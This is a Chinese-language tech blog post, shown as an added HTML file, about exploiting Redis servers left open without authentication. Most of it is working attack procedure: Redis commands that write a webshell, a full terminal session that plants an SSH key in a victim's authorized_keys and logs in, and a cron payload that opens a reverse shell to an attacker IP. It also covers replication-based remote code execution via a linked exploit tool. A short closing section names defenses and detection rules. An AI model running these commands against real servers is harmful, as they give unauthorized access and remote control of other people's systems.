@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <link rel="alternate" href="/atom.xml" title="lmy" type="application/atom+xml">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.5.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="redis未授权漏洞利用1. 背景 redis是什么? Redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库 redis有哪些使用场景  Redis经常被应用于以下场景 缓存 (Session Cache) 队列 (PUB&#x2F;SUB) 计数器 ……">
+<meta property="og:type" content="article">
+<meta property="og:title" content="redis未授权漏洞利用">
+<meta property="og:url" content="https:&#x2F;&#x2F;lmy-xdd.github.io&#x2F;2019&#x2F;01&#x2F;20&#x2F;redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8&#x2F;index.html">
+<meta property="og:site_name" content="lmy">
+<meta property="og:description" content="redis未授权漏洞利用1. 背景 redis是什么? Redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库 redis有哪些使用场景  Redis经常被应用于以下场景 缓存 (Session Cache) 队列 (PUB&#x2F;SUB) 计数器 ……">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https:&#x2F;&#x2F;saucer-man.com&#x2F;usr&#x2F;uploads&#x2F;2019&#x2F;07&#x2F;4236294815.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;saucer-man.com&#x2F;usr&#x2F;uploads&#x2F;2019&#x2F;07&#x2F;2892400958.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;saucer-man.com&#x2F;usr&#x2F;uploads&#x2F;2019&#x2F;07&#x2F;2546597886.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;saucer-man.com&#x2F;usr&#x2F;uploads&#x2F;2019&#x2F;07&#x2F;3667569243.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;saucer-man.com&#x2F;usr&#x2F;uploads&#x2F;2019&#x2F;07&#x2F;3313685409.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;saucer-man.com&#x2F;usr&#x2F;uploads&#x2F;2019&#x2F;07&#x2F;2696015178.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;saucer-man.com&#x2F;usr&#x2F;uploads&#x2F;2019&#x2F;07&#x2F;1109732426.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;saucer-man.com&#x2F;usr&#x2F;uploads&#x2F;2019&#x2F;07&#x2F;1901225325.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;saucer-man.com&#x2F;usr&#x2F;uploads&#x2F;2019&#x2F;07&#x2F;3207406108.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;saucer-man.com&#x2F;usr&#x2F;uploads&#x2F;2019&#x2F;07&#x2F;564360520.png">
+<meta property="og:updated_time" content="2019-12-02T09:36:19.794Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;saucer-man.com&#x2F;usr&#x2F;uploads&#x2F;2019&#x2F;07&#x2F;4236294815.png">
+
+<link rel="canonical" href="https://lmy-xdd.github.io/2019/01/20/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>redis未授权漏洞利用 | lmy</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">lmy</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://lmy-xdd.github.io/2019/01/20/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lmy.jpg">
+      <meta itemprop="name" content="Liu Mingyi">
+      <meta itemprop="description" content="我的邮箱是liumingyi0809@gmail.com,欢迎技术讨论">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lmy">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          redis未授权漏洞利用
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-01-20 18:35:16" itemprop="dateCreated datePublished" datetime="2019-01-20T18:35:16+08:00">2019-01-20</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%9F%BA%E7%A1%80/" itemprop="url" rel="index">
+                    <span itemprop="name">基础</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="redis未授权漏洞利用"><a href="#redis未授权漏洞利用" class="headerlink" title="redis未授权漏洞利用"></a>redis未授权漏洞利用</h1><h2 id="1-背景"><a href="#1-背景" class="headerlink" title="1. 背景"></a>1. 背景</h2><ol>
+<li>redis是什么?</li>
+</ol><p>Redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库</p><ol>
+<li>redis有哪些使用场景</li>
+</ol><ul>
+<li>Redis经常被应用于以下场景</li>
+<li>缓存 (Session Cache)</li>
+<li>队列 (PUB/SUB)</li>
+<li>计数器</li>
+<li>……</li>
+</ul><a id="more"></a>
+
+
+
+<ol>
+<li>redis默认端口：6379/tcp</li>
+</ol>
+<p>最近几年市场使用redis数据库是越来越多，reids本身没有爆出什么漏洞，但是redis未授权访问是非常普遍的，尤其在内网中，配合ssrf getshell也是很常见的漏洞组合方式。</p>
+<p>下面我用<a href="https://github.com/saucer-man/saucerframe" target="_blank" rel="noopener">saucerframe</a>通过Zoomeye扫了100个ip，其中存在未授权的就有好几个~</p>
+<p><a href="https://saucer-man.com/usr/uploads/2019/07/4236294815.png" target="_blank" rel="noopener"><img src="https://saucer-man.com/usr/uploads/2019/07/4236294815.png" alt="img"></a></p>
+<h2 id="2-利用"><a href="#2-利用" class="headerlink" title="2. 利用"></a>2. 利用</h2><p>当你凑巧发现了redis未授权访问的主机，你会咋办，难道是看看数据，报个信息泄露吗？作为一名志向高远的黑客，当然不能从此放弃，于是我们向getshell的道路上努力前进</p>
+<h3 id="2-1-利用写文件getshell"><a href="#2-1-利用写文件getshell" class="headerlink" title="2.1 利用写文件getshell"></a>2.1 利用写文件getshell</h3><p>redis虽然是一个内存数据库，但是其也提供了持久化的功能。毕竟持久是必须的，在这个方面redis提供了备份功能，可以将内存中的数据库暂时备份到文件中，也可以从文件中加载数据到内存。其备份的文件名也是随意可控的。</p>
+<p>那么我们就可以利用备份功能实现写任意文件，通常写以下文件来进一步利用：</p>
+<ul>
+<li>webshell</li>
+<li>写ssh公钥文件实现免密登录</li>
+<li>写定时文件执行命令反弹shell</li>
+</ul>
+<p>具体写文件的命令是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 设置备份文件路径</span><br><span class="line">config set dir /var/www/html/</span><br><span class="line"></span><br><span class="line"># 设置备份文件名</span><br><span class="line">config set dbfilename phpinfo.php</span><br><span class="line"></span><br><span class="line"># 向数据库插入payload</span><br><span class="line">set payload &quot;&lt;?php phpinfo(); ?&gt;&quot;</span><br><span class="line"></span><br><span class="line"># 保存数据库到备份文件</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<p>下面大概讲一下写文件的方式</p>
+<h4 id="2-1-1-写webshell"><a href="#2-1-1-写webshell" class="headerlink" title="2.1.1 写webshell"></a>2.1.1 写webshell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.设置web路径</span><br><span class="line">config set dir /var/www/html/</span><br><span class="line"></span><br><span class="line">2.设置shell文件名</span><br><span class="line">config set dbfilename phpinfo.php</span><br><span class="line"></span><br><span class="line">3.向数据库插入payload</span><br><span class="line">set payload &quot;&lt;?php phpinfo(); ?&gt;&quot;</span><br><span class="line"></span><br><span class="line">4.保存webshell</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://saucer-man.com/usr/uploads/2019/07/2892400958.png" target="_blank" rel="noopener"><img src="https://saucer-man.com/usr/uploads/2019/07/2892400958.png" alt="img"></a><br><a href="https://saucer-man.com/usr/uploads/2019/07/2546597886.png" target="_blank" rel="noopener"><img src="https://saucer-man.com/usr/uploads/2019/07/2546597886.png" alt="img"></a></p>
+<h4 id="2-1-2-写ssh公钥"><a href="#2-1-2-写ssh公钥" class="headerlink" title="2.1.2 写ssh公钥"></a>2.1.2 写ssh公钥</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">1. 生成ssh私钥对</span><br><span class="line">root@kali:~/.ssh# ssh-keygen -t rsa</span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file in which to save the key (/root/.ssh/id_rsa): </span><br><span class="line">Enter passphrase (empty for no passphrase): </span><br><span class="line">Enter same passphrase again: </span><br><span class="line">Your identification has been saved in /root/.ssh/id_rsa.</span><br><span class="line">Your public key has been saved in /root/.ssh/id_rsa.pub.</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:6sAufeQNxTthzC7f7VPx/8Bqj8vBz9EgftgaOKNY7C0 root@kali</span><br><span class="line">The key&apos;s randomart image is:</span><br><span class="line">+---[RSA 2048]----+</span><br><span class="line">|                 |</span><br><span class="line">|                 |</span><br><span class="line">|       +         |</span><br><span class="line">|        B     .  |</span><br><span class="line">|       +So  . .o |</span><br><span class="line">|   .  +o+  + =.o.|</span><br><span class="line">|   .oo.=oo+.*.* o|</span><br><span class="line">|  ...oo+Eo.++X o.|</span><br><span class="line">|   ...o o..oB++ o|</span><br><span class="line">+----[SHA256]-----+</span><br><span class="line">root@kali:~/.ssh# ls</span><br><span class="line">id_rsa  id_rsa.pub  known_hosts</span><br><span class="line"></span><br><span class="line">2.将公钥文件内容上下留两行(这样保存在受害者公钥文件可以避免脏数据的影响)</span><br><span class="line">root@kali:~/.ssh# vim id_rsa.pub </span><br><span class="line">root@kali:~/.ssh# cd ~/redis-5.0.5/src/</span><br><span class="line">root@kali:~/redis-5.0.5/src# cat /root/.ssh/id_rsa.pub </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5X6pxsqJblwjGw3mSfpvnya78Tro68lh5K0k9ZPW4Oe1uRnQenmHY/Ou5f+nJXBRrmJijQa0BjzzJnKThkPuIMpIjy77D07xCAgwLqk0OfEFFpJjPf0Kxq/C88hYvlWr2LHqVSUh9+y9hhGUwzMN9nkh6IOJAosZtZc3zJ4kc4pnddc3CPOmxpxf5ztLYotUdChAPZhKGFI3TCdIMaZ4QNeWhQWOkHld1/0lOcVyeUX6GBVAenvT4fQnGJEt3SNY6xZebTthdSE6MZTQiWYMaBlp0Shb/YkWbtx6Gy8VpUvL8fknZKS6YsrB+hM8gp2A4mtNaBY4fguMhlrh+xk65 root@kali</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3.读取公钥文件保存到数据库中</span><br><span class="line">root@kali:~/redis-5.0.5/src# cat /root/.ssh/id_rsa.pub | ./redis-cli -h 10.10.12.78 -x set ssh</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line">4.设置公钥地址文件名并且保存</span><br><span class="line"></span><br><span class="line">root@kali:~/redis-5.0.5/src# ./redis-cli -h 10.10.12.78</span><br><span class="line">10.10.12.78:6379&gt; keys ssh</span><br><span class="line">1) &quot;ssh&quot;</span><br><span class="line">10.10.12.78:6379&gt; config set dir /home/ubuntu/.ssh</span><br><span class="line">OK</span><br><span class="line">10.10.12.78:6379&gt; config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">OK</span><br><span class="line">10.10.12.78:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">10.10.12.78:6379&gt; exit</span><br><span class="line"></span><br><span class="line">5.接下来即可通过私钥登录</span><br><span class="line"></span><br><span class="line">root@kali:~/redis-5.0.5/src# ssh ubuntu@10.10.12.78 -i /root/.ssh/id_rsa</span><br><span class="line">Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-55-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line"> * MicroK8s 1.15 is out! Thanks to all 40 contributors, you get the latest</span><br><span class="line">   greatest upstream Kubernetes in a single package.</span><br><span class="line"></span><br><span class="line">     https://github.com/ubuntu/microk8s</span><br><span class="line"></span><br><span class="line"> * Canonical Livepatch is available for installation.</span><br><span class="line">   - Reduce system reboots and improve kernel security. Activate at:</span><br><span class="line">     https://ubuntu.com/livepatch</span><br><span class="line"></span><br><span class="line">348 packages can be updated.</span><br><span class="line">0 updates are security updates.</span><br><span class="line"></span><br><span class="line">Last login: Wed Jul 17 20:53:08 2019 from 192.168.1.136</span><br><span class="line">ubuntu@ubuntu:~$ </span><br><span class="line"></span><br><span class="line">6. 这里我们看下写入的公钥文件长什么样子</span><br><span class="line">ubuntu@ubuntu:~$ cat .ssh/authorized_keys </span><br><span class="line">REDIS0009�    redis-ver5.0.5�</span><br><span class="line">redis-bits�@�ctime��;]used-mem�(p    �</span><br><span class="line">                                         aof-preamble���sshA�</span><br><span class="line"></span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5X6pxsqJblwjGw3mSfpvnya78Tro68lh5K0k9ZPW4Oe1uRnQenmHY/Ou5f+nJXBRrmJijQa0BjzzJnKThkPuIMpIjy77D07xCAgwLqk0OfEFFpJjPf0Kxq/C88hYvlWr2LHqVSUh9+y9hhGUwzMN9nkh6IOJAosZtZc3zJ4kc4pnddc3CPOmxpxf5ztLYotUdChAPZhKGFI3TCdIMaZ4QNeWhQWOkHld1/0lOcVyeUX6GBVAenvT4fQnGJEt3SNY6xZebTthdSE6MZTQiWYMaBlp0Shb/YkWbtx6Gy8VpUvL8fknZKS6YsrB+hM8gp2A4mtNaBY4fguMhlrh+xk65 root@kali</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">����^z1��</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-1-3-写定时任务反弹shell"><a href="#2-1-3-写定时任务反弹shell" class="headerlink" title="2.1.3 写定时任务反弹shell"></a>2.1.3 写定时任务反弹shell</h4><p>这个方法只能Centos上使用，Ubuntu上行不通，故未测试。原因如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.权限问题，ubuntu定时任务需要root权限</span><br><span class="line">2.redis备份文件存在乱码，在Ubuntu上会报错，而在Centos上不会报错</span><br></pre></td></tr></table></figure>
+
+<p>利用流程如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.设置文件名和路径(这个因系统不同而路径不同)</span><br><span class="line">config set dir /var/spool/cron/crontabs</span><br><span class="line">config set dbfilename root</span><br><span class="line"></span><br><span class="line">2.插入定时任务</span><br><span class="line">set payload &quot;* * * * * bash -i &gt;&amp; /dev/tcp/10.10.12.47/8888 0&gt;&amp;1&quot;</span><br><span class="line"></span><br><span class="line">3.保存</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<p>通过以上三种方法我们实现了写文件getshell，但是其中的弊端也很容易发现</p>
+<ul>
+<li>需要知道要写的文件地址和路径</li>
+<li>需要对写入文件有读写权限</li>
+<li>会写入很多无用数据，可能会导致程序出错</li>
+<li>需要利用到其他程序，比如web应用程序，如果利用docker部署，上述方法即失效。</li>
+</ul>
+<h2 id="2-2-基于主从复制实现rce"><a href="#2-2-基于主从复制实现rce" class="headerlink" title="2.2 基于主从复制实现rce"></a>2.2 基于主从复制实现rce</h2><p>这种方式是LC/BC的成员Pavel Toporkov在2019年7月7日结束的WCTF2019 Final分享的，算是新鲜出炉的方式了。</p>
+<p>在介绍这种利用方式之前，首先我们需要介绍一下什么是主从复制和redis的模块。</p>
+<ul>
+<li>redis主从复制</li>
+</ul>
+<p>如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p>
+<p><a href="https://saucer-man.com/usr/uploads/2019/07/3667569243.png" target="_blank" rel="noopener"><img src="https://saucer-man.com/usr/uploads/2019/07/3667569243.png" alt="img"></a></p>
+<p>可用过下图来理解,其中slaveof 172.17.0.3就是将其设置为自己的主节点，主机数据会同步到每个从节点。</p>
+<p><a href="https://saucer-man.com/usr/uploads/2019/07/3313685409.png" target="_blank" rel="noopener"><img src="https://saucer-man.com/usr/uploads/2019/07/3313685409.png" alt="img"></a></p>
+<ul>
+<li>redis模块</li>
+</ul>
+<p>和mysql类似，redis也支持扩展命令，我们需要编写so文件，来扩展命令，具体怎么写的就不用管了，反正知道可以通过加载so文件来扩展命令就对了。</p>
+<p>比如写一个可以执行系统命令的扩展:</p>
+<p><a href="https://saucer-man.com/usr/uploads/2019/07/2696015178.png" target="_blank" rel="noopener"><img src="https://saucer-man.com/usr/uploads/2019/07/2696015178.png" alt="img"></a></p>
+<p>于是问题变得很简单，我们只要想办法将so文件传输过去然后加载即可实现任意命令执行。</p>
+<p>具体的步骤如下：</p>
+<p><a href="https://saucer-man.com/usr/uploads/2019/07/1109732426.png" target="_blank" rel="noopener"><img src="https://saucer-man.com/usr/uploads/2019/07/1109732426.png" alt="img"></a></p>
+<ul>
+<li>第一步，我们伪装成redis数据库，然后受害者将我们的数据库设置为主节点。</li>
+<li>第二步，我们设置备份文件名为so文件</li>
+<li>第三步，设置传输方式为全量传输</li>
+<li>第四步加载so文件，实现任意命令执行</li>
+</ul>
+<p>这里需要解释一下，redis主从数据库之间的同步分为两种，全量复制和部分复制，全量复制是将数据库备份文件整个传输过去，然后从节点清空内存数据库，将备份文件加载到数据库中。而部分复制只是将写命令发送给从节点。</p>
+<p>这里我们选择全量复制，就可以将备份文件（so）文件传输过去。</p>
+<p>但是还有个小问题，为什么我们要伪装成redis数据库，难道不是用真的数据库来传文件吗？少年，远不用那么麻烦，我们只需要根据协议收包发包就可以假装自己是数据库了啊。</p>
+<p>和tcp三次握手类似，主从数据库之间建立关系也是通过几次握手来实现的，当然了比三次握手稍微复杂一点。</p>
+<p><a href="https://saucer-man.com/usr/uploads/2019/07/1901225325.png" target="_blank" rel="noopener"><img src="https://saucer-man.com/usr/uploads/2019/07/1901225325.png" alt="img"></a></p>
+<p>接收到PING发个PONG，接收到REPLCONF我们就发OK…总之以假乱真。</p>
+<p>原理很简单，方法一出，exp当然也很快就来了。</p>
+<p><a href="https://github.com/Ridter/redis-rce" target="_blank" rel="noopener">https://github.com/Ridter/redis-rce</a></p>
+<p>我们可以使用-v参数看下具体发了哪些数据包来帮助理解。</p>
+<p><a href="https://saucer-man.com/usr/uploads/2019/07/3207406108.png" target="_blank" rel="noopener"><img src="https://saucer-man.com/usr/uploads/2019/07/3207406108.png" alt="img"></a></p>
+<p>成功后，我们可以查看目标目录下面出现了exp.so</p>
+<p><a href="https://saucer-man.com/usr/uploads/2019/07/564360520.png" target="_blank" rel="noopener"><img src="https://saucer-man.com/usr/uploads/2019/07/564360520.png" alt="img"></a></p>
+<h2 id="3-防御"><a href="#3-防御" class="headerlink" title="3. 防御"></a>3. 防御</h2><p>一切的根源都是redis未授权导致的，所以。。。</p>
+<p>当然了企业内网中可以用nids检测，比如suricata中，规则可以看下：<a href="https://github.com/ptresearch/AttackDetection/blob/master/redis_replication_rce/redis_replication_rce.rules" target="_blank" rel="noopener">https://github.com/ptresearch/AttackDetection/blob/master/redis_replication_rce/redis_replication_rce.rules</a></p>
+<h2 id="4-参考"><a href="#4-参考" class="headerlink" title="4. 参考"></a>4. 参考</h2><ul>
+<li><a href="https://xz.aliyun.com/t/5665" target="_blank" rel="noopener">浅析Redis中SSRF的利用</a></li>
+<li><a href="https://www.cnblogs.com/bmjoker/p/9548962.html" target="_blank" rel="noopener">Redis未授权访问漏洞复现与利用</a></li>
+<li><a href="https://lorexxar.cn/2019/07/10/redis-5-x-rce/" target="_blank" rel="noopener">Redis 基于主从复制的RCE利用方式</a></li>
+<li><a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf" target="_blank" rel="noopener">redis-post-exploitation.pdf</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Liu Mingyi
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://lmy-xdd.github.io/2019/01/20/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" title="redis未授权漏洞利用">https://lmy-xdd.github.io/2019/01/20/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/null" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+                <a href="/2019/01/05/jwt%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/" rel="next" title="jwt安全测试">
+                  <i class="fa fa-chevron-left"></i> jwt安全测试
+                </a>
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+            </div>
+          </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
